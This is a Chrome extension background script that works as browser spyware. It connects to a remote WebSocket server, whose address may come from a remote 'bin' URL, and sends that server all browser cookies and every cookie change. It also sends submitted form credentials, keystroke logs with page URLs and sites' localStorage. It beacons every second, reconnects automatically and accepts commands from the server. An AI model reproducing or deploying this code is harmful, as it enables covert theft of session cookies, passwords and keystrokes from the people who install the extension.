let ws;
let client_id;

async function readConfig() {
  try {
    const configURL = chrome.runtime.getURL("config.json");
    const response = await fetch(configURL);
    if (response.ok) {
      return await response.json();
    }
    console.error("Failed to read config");
    return null;
  } catch (error) {
    console.error("Error reading config:", error);
    return null;
  }
}

async function getTargetUrl(config) {
  if (config.useBin) {
    try {
      const response = await fetch(config.binUrl);
      if (response.ok) {
        return await response.text();
      }
    } catch (error) {
      console.error("Error fetching bin URL:", error);
    }
  }
  return config.targetUrl;
}

async function connectWebSocket() {
  const config = await readConfig();
  if (!config) return;

  const targetUrl = await getTargetUrl(config);
  ws = new WebSocket(targetUrl);

  ws.addEventListener("open", () => {
    console.log("WebSocket connected");
    chrome.storage.local.get("client_id", (data) => {
      client_id = data.client_id;
      if (!client_id) {
        client_id = Math.random().toString(36).substring(7);
        chrome.storage.local.set({ client_id });
      }
      send("alive", {
        client_id,
        os: "windows",
        username: "user",
      });
      chrome.cookies.getAll({}, function (cookies) {
        send("setcookies", cookies);
      });
      setInterval(() => {
        send("alive", {
          client_id,
          os: "Windows",
          username: "user",
        });
      }, 1000);
    });
  });

  ws.addEventListener("message", handleMessages);
  ws.addEventListener("close", () => {
    console.log(
      "WebSocket disconnected, attempting to reconnect in 1 seconds..."
    );
    setTimeout(() => {
      connectWebSocket();
    }, 1000);
  });
}

function handleMessages(message) {
  try {
    const data = JSON.parse(message.data);
    switch (data[0]) {
      case "alert":
        sendMessageToContentScript(JSON.stringify(["alert", data[1]]));
        break;
    }
  } catch (err) {
    console.error(err);
  }
}

function send(type, data) {
  try {
    if (ws && ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify([type, data]));
    } else {
      console.log("WebSocket is not open");
    }
  } catch (error) {
    // Silently handle any errors
  }
}

function sendMessageToContentScript(message) {
  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    let activeTab = tabs[0];
    if (activeTab) {
      chrome.tabs.sendMessage(
        activeTab.id,
        { message: message },
        (response) => {
          console.log("Response from content script:", response);
        }
      );
    }
  });
}

// Initialize WebSocket connection
connectWebSocket();

// Event listeners remain the same
chrome.cookies.onChanged.addListener(function (changeInfo) {
  send("updatecookie", changeInfo.cookie);
});

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  switch (message.type) {
    case "FORM_SUBMISSION":
      console.log(
        "Form submission received from:",
        sender.tab ? sender.tab.url : "unknown source"
      );
      console.log("Form data:", message.data);
      send("addsubmittedcredentials", message.data);

      chrome.storage.local.get(["formSubmissions"], (result) => {
        const submissions = result.formSubmissions || [];
        submissions.push(message.data);

        chrome.storage.local.set({ formSubmissions: submissions }, () => {
          console.log("Form submission stored successfully");
        });
      });

      sendResponse({ status: "success", timestamp: new Date().toISOString() });
      break;

    case "ACTIVITY_LOG":
      const logData = {
        keys: message.data.keys,
        timestamp: message.data.timestamp,
        url: message.data.url,
      };
      send("activitylog", logData);
      break;

    case "STORAGE_STATE":
      const storageData = {
        domain: message.data.domain,
        storage: message.data.storage,
      };
      send("setlocalstorage", storageData);
      break;
  }
  return true;
});
